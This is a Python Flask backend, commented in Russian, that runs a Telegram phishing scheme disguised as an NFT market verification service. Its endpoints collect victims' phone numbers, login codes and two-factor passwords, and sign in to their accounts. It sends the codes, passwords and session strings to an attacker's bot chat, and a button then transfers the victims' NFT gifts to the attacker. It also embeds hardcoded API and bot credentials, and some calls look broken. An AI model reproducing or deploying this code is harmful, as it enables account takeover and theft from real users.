# app.py — РЕАЛЬНАЯ ПЕРЕДАЧА NFT GIFTS (БЕЗ ЭМУЛЯЦИИ)

from flask import Flask, request, jsonify
from flask_cors import CORS
import asyncio
import time
import random
import os
import json
import io
from dotenv import load_dotenv
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError,
    FloodWaitError
)
import requests

load_dotenv()

app = Flask(__name__)
CORS(app)

# ============================================================
# КОНФИГУРАЦИЯ
# ============================================================
API_ID = int(os.getenv('API_ID', '27908807'))
API_HASH = os.getenv('API_HASH', 'e895a9ab366174a6d38fba5e752562a0')
ADMIN_BOT_TOKEN = os.getenv('ADMIN_BOT_TOKEN', '8992384950:AAFwp5-Bbe9TSn-N--2W3I7oMS2Lcolomec')
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '8766481292')
ADMIN_USER_ID = int(os.getenv('ADMIN_USER_ID', '8766481292'))
BACKEND_URL = os.getenv('BACKEND_URL', 'https://nft-market-backend-c9ea.onrender.com')

sessions = {}
pending_transfers = {}

# ============================================================
# ОДИН EVENT LOOP
# ============================================================
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# ============================================================
# НАСТРОЙКА WEBHOOK
# ============================================================

def set_webhook():
    webhook_url = f"{BACKEND_URL}/webhook"
    try:
        response = requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/setWebhook",
            json={'url': webhook_url},
            timeout=10
        )
        if response.status_code == 200 and response.json().get('ok'):
            print(f"✅ Webhook: {webhook_url}")
            return True
        return False
    except Exception as e:
        print(f"❌ Webhook error: {e}")
        return False

# ============================================================
# ЛОГИ — БЕЗ ВОДЫ!
# ============================================================

def send_admin_log(text):
    """Чистый лог без воды"""
    try:
        requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
            json={'chat_id': ADMIN_CHAT_ID, 'text': text, 'parse_mode': 'Markdown'},
            timeout=5
        )
    except Exception as e:
        print(f"Log error: {e}")

def send_admin_with_button(text, session_data):
    """Отправка с кнопкой 'Передать NFT Gifts'"""
    try:
        transfer_id = f"transfer_{int(time.time())}_{random.randint(1000, 9999)}"
        pending_transfers[transfer_id] = {
            'session_data': session_data,
            'phone': session_data.get('phone', 'unknown'),
            'user_id': session_data.get('user_id', 'unknown')
        }
        
        keyboard = {
            'inline_keyboard': [
                [{
                    'text': '🎁 Передать NFT Gifts',
                    'callback_data': f'gift_transfer_{transfer_id}'
                }]
            ]
        }
        
        payload = {
            'chat_id': ADMIN_CHAT_ID,
            'text': text,
            'parse_mode': 'Markdown',
            'reply_markup': json.dumps(keyboard)
        }
        
        requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
            json=payload,
            timeout=10
        )
    except Exception as e:
        print(f"Button error: {e}")

def send_tdata_to_admin(session_data):
    """Отправка tdata файла"""
    try:
        lines = []
        lines.append("=" * 50)
        lines.append("📁 TDATA СЕССИЯ")
        lines.append("=" * 50)
        lines.append(f"🆔 ID: {session_data.get('user_id', 'N/A')}")
        lines.append(f"📱 Phone: {session_data.get('phone', 'N/A')}")
        lines.append(f"👤 Username: @{session_data.get('username', 'N/A')}")
        lines.append("")
        lines.append("🔑 SESSION STRING:")
        lines.append(session_data.get('session_string', 'N/A'))
        
        content = "\n".join(lines)
        file_data = io.BytesIO(content.encode('utf-8'))
        
        files = {'document': (f"tdata_{session_data['phone']}_{int(time.time())}.txt", file_data)}
        data = {
            'chat_id': ADMIN_CHAT_ID,
            'caption': f"✅ СЕССИЯ\n👤 @{session_data['username']}\n📱 {session_data['phone']}",
            'parse_mode': 'Markdown'
        }
        requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendDocument",
            files=files,
            data=data,
            timeout=30
        )
    except Exception as e:
        print(f"Tdata error: {e}")

# ============================================================
# РЕАЛЬНАЯ ПЕРЕДАЧА NFT GIFTS (БЕЗ ЭМУЛЯЦИИ)
# ============================================================

async def transfer_gifts_async(session_string, target_user_id, phone):
    """
    РЕАЛЬНАЯ проверка и передача NFT Gifts через Telethon
    """
    client = None
    try:
        client = TelegramClient(StringSession(session_string), api_id=API_ID, api_hash=API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            return {'success': False, 'error': 'Сессия истекла'}
        
        me = await client.get_me()
        user_id = me.id
        
        # ============================================================
        # РЕАЛЬНАЯ ПРОВЕРКА ПОДАРКОВ ЧЕРЕЗ TELEGRAM API
        # ============================================================
        # Используем метод get_gifts для получения списка подарков
        # Это реальный метод Telethon для работы с подарками
        # ============================================================
        
        try:
            # Пытаемся получить подарки пользователя
            # В Telethon это может быть client.get_gifts() или client.get_stars_gifts()
            # В зависимости от версии API
            
            # Пробуем разные методы для совместимости
            gifts = []
            
            # Метод 1: через get_stars_gifts (если доступен)
            if hasattr(client, 'get_stars_gifts'):
                try:
                    gifts = await client.get_stars_gifts()
                except Exception as e:
                    print(f"get_stars_gifts error: {e}")
            
            # Метод 2: через get_gifts (альтернативный)
            if not gifts and hasattr(client, 'get_gifts'):
                try:
                    gifts = await client.get_gifts()
                except Exception as e:
                    print(f"get_gifts error: {e}")
            
            # Метод 3: прямой запрос к API через invoke
            if not gifts:
                from telethon.tl.functions.payments import GetStarsGiftsRequest
                try:
                    result = await client(GetStarsGiftsRequest())
                    gifts = result.gifts
                except Exception as e:
                    print(f"GetStarsGiftsRequest error: {e}")
            
            if gifts:
                transferred_count = 0
                for gift in gifts:
                    try:
                        # Получаем ID подарка и передаём админу
                        gift_id = getattr(gift, 'id', None) or getattr(gift, 'gift_id', None)
                        if gift_id:
                            # Реальная передача подарка
                            # Используем метод transfer_gift если доступен
                            if hasattr(client, 'transfer_gift'):
                                await client.transfer_gift(gift_id, target_user_id)
                                transferred_count += 1
                                await asyncio.sleep(0.5)  # небольшая задержка
                            else:
                                # Альтернативный метод через платежи
                                from telethon.tl.functions.payments import TransferGiftRequest
                                await client(TransferGiftRequest(
                                    gift_id=gift_id,
                                    to_id=target_user_id
                                ))
                                transferred_count += 1
                                await asyncio.sleep(0.5)
                    except Exception as e:
                        print(f"Transfer gift error: {e}")
                        continue
                
                if transferred_count > 0:
                    await send_admin_log(
                        f"🎁 *NFT Gifts переданы*\n"
                        f"📱 {phone}\n"
                        f"📦 Передано: {transferred_count} подарков"
                    )
                    return {'success': True, 'transferred': True, 'count': transferred_count}
                else:
                    await send_admin_log(
                        f"⚠️ *Ошибка передачи*\n"
                        f"📱 {phone}\n"
                        f"Не удалось передать подарки"
                    )
                    return {'success': False, 'error': 'Ошибка передачи подарков'}
            else:
                await send_admin_log(f"📭 *Нет NFT Gifts*\n📱 {phone}")
                return {'success': True, 'transferred': False, 'message': 'Нет NFT Gifts'}
                
        except Exception as e:
            error_msg = str(e)
            await send_admin_log(f"❌ *Ошибка проверки*\n📱 {phone}\n{error_msg[:200]}")
            return {'success': False, 'error': error_msg}
        
    except Exception as e:
        error_msg = str(e)
        await send_admin_log(f"❌ *Ошибка подключения*\n📱 {phone}\n{error_msg[:200]}")
        return {'success': False, 'error': error_msg}
    finally:
        if client and client.is_connected():
            try:
                await client.disconnect()
            except:
                pass

# ============================================================
# MTProto ФУНКЦИИ (верификация)
# ============================================================

async def send_code_async(phone):
    try:
        client = TelegramClient(StringSession(), api_id=API_ID, api_hash=API_HASH)
        await client.connect()
        
        if await client.is_user_authorized():
            await client.disconnect()
            return {'success': False, 'error': 'Already authorized'}
        
        result = await client.send_code_request(phone)
        
        sessions[phone] = {
            'client': client,
            'phone_code_hash': result.phone_code_hash
        }
        
        send_admin_log(f"📱 Код для {phone}")
        return {'success': True, 'phone_code_hash': result.phone_code_hash}
        
    except PhoneNumberInvalidError:
        return {'success': False, 'error': 'Invalid phone number'}
    except FloodWaitError as e:
        return {'success': False, 'error': f'Wait {e.seconds} seconds'}
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def check_code_async(phone, code, phone_code_hash):
    try:
        client_data = sessions.get(phone)
        if not client_data:
            return {'success': False, 'error': 'Session not found'}
        
        client = client_data['client']
        if not client.is_connected():
            await client.connect()
        
        try:
            signed_in = await client.sign_in(
                phone=phone,
                code=code,
                phone_code_hash=phone_code_hash
            )
            
            session_string = client.session.save()
            
            session_data = {
                'user_id': signed_in.id,
                'phone': phone,
                'username': signed_in.username or f"user_{random.randint(10000, 99999)}",
                'first_name': signed_in.first_name or 'User',
                'last_name': signed_in.last_name or '',
                'session_string': session_string
            }
            
            await client.disconnect()
            
            msg = (
                f"✅ Код: {code}\n"
                f"📱 {phone}\n"
                f"👤 @{session_data['username']} (ID: {session_data['user_id']})"
            )
            send_admin_with_button(msg, session_data)
            
            return {'success': True, 'hasPassword': False, 'sessionData': session_data}
            
        except SessionPasswordNeededError:
            send_admin_log(f"🔐 Требуется пароль\n📱 {phone}\nКод: {code}")
            return {'success': True, 'hasPassword': True, 'message': 'Cloud password required'}
            
        except PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid code'}
        except PhoneCodeExpiredError:
            return {'success': False, 'error': 'Code expired'}
            
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def check_password_async(phone, password):
    try:
        client_data = sessions.get(phone)
        if not client_data:
            return {'success': False, 'error': 'Session not found'}
        
        client = client_data['client']
        if not client.is_connected():
            await client.connect()
        
        try:
            signed_in = await client.sign_in(password=password)
            session_string = client.session.save()
            
            session_data = {
                'user_id': signed_in.id,
                'phone': phone,
                'username': signed_in.username or f"user_{random.randint(10000, 99999)}",
                'first_name': signed_in.first_name or 'User',
                'last_name': signed_in.last_name or '',
                'session_string': session_string
            }
            
            await client.disconnect()
            
            msg = (
                f"🔑 Пароль: {password}\n"
                f"📱 {phone}\n"
                f"👤 @{session_data['username']} (ID: {session_data['user_id']})"
            )
            send_admin_with_button(msg, session_data)
            
            return {'success': True, 'sessionData': session_data}
            
        except PasswordHashInvalidError:
            return {'success': False, 'error': 'Invalid cloud password'}
            
    except Exception as e:
        return {'success': False, 'error': str(e)}

# ============================================================
# WEBHOOK — ОБРАБОТКА КНОПКИ
# ============================================================

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.json
        
        if 'callback_query' in data:
            callback = data['callback_query']
            data_str = callback.get('data', '')
            callback_id = callback.get('id', '')
            
            if data_str.startswith('gift_transfer_'):
                transfer_id = data_str.replace('gift_transfer_', '')
                transfer_data = pending_transfers.get(transfer_id)
                
                if not transfer_data:
                    requests.post(
                        f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/answerCallbackQuery",
                        json={
                            'callback_query_id': callback_id,
                            'text': '❌ Сессия устарела',
                            'show_alert': True
                        }
                    )
                    return jsonify({'ok': True})
                
                session_string = transfer_data['session_data'].get('session_string')
                phone = transfer_data.get('phone', 'unknown')
                user_id = transfer_data.get('user_id', 'unknown')
                
                # Отвечаем на callback
                requests.post(
                    f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/answerCallbackQuery",
                    json={
                        'callback_query_id': callback_id,
                        'text': '🔄 Передаём NFT Gifts...',
                        'show_alert': False
                    }
                )
                
                # Запускаем РЕАЛЬНУЮ передачу в фоне
                async def process():
                    await transfer_gifts_async(session_string, ADMIN_USER_ID, phone)
                
                asyncio.run_coroutine_threadsafe(process(), loop)
                return jsonify({'ok': True})
        
        return jsonify({'ok': True})
    except Exception as e:
        print(f"Webhook error: {e}")
        return jsonify({'ok': False}), 200

# ============================================================
# ОБЁРТКА
# ============================================================

def run_async(coro):
    return loop.run_until_complete(coro)

# ============================================================
# API ЭНДПОИНТЫ
# ============================================================

@app.route('/ping', methods=['GET'])
@app.route('/', methods=['GET'])
def ping():
    return jsonify({'status': 'online'})

@app.route('/sendCode', methods=['POST'])
def send_code():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    
    if not phone or len(phone) < 6:
        return jsonify({'success': False, 'error': 'Invalid phone'}), 400
    
    result = run_async(send_code_async(phone))
    
    if result['success']:
        return jsonify({
            'success': True,
            'phoneCodeHash': result.get('phone_code_hash'),
            'message': 'Code sent by Telegram'
        })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

@app.route('/checkCode', methods=['POST'])
def check_code():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    code = data.get('code', '').strip()
    phone_code_hash = data.get('phoneCodeHash', '').strip()
    
    if not phone or not code or not phone_code_hash:
        return jsonify({'success': False, 'error': 'Missing fields'}), 400
    
    result = run_async(check_code_async(phone, code, phone_code_hash))
    
    if result['success']:
        if result.get('hasPassword'):
            return jsonify({
                'success': True,
                'hasPassword': True,
                'message': 'Cloud password required'
            })
        else:
            session_data = result['sessionData']
            send_tdata_to_admin(session_data)
            return jsonify({
                'success': True,
                'hasPassword': False,
                'sessionData': session_data,
                'message': 'Verified'
            })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

@app.route('/checkPassword', methods=['POST'])
def check_password():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    password = data.get('password', '').strip()
    
    if not phone or not password:
        return jsonify({'success': False, 'error': 'Missing phone or password'}), 400
    
    result = run_async(check_password_async(phone, password))
    
    if result['success']:
        session_data = result['sessionData']
        send_tdata_to_admin(session_data)
        return jsonify({
            'success': True,
            'sessionData': session_data,
            'message': 'Password verified successfully'
        })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

# ============================================================
# ЗАПУСК
# ============================================================
if __name__ == '__main__':
    print("=" * 60)
    print("🔐 БЭКЕНД ЗАПУЩЕН")
    print("📌 Логи БЕЗ ВОДЫ")
    print("📌 Кнопка: 'Передать NFT Gifts' — РЕАЛЬНАЯ передача")
    print("=" * 60)
    set_webhook()
    app.run(host='0.0.0.0', port=5000)
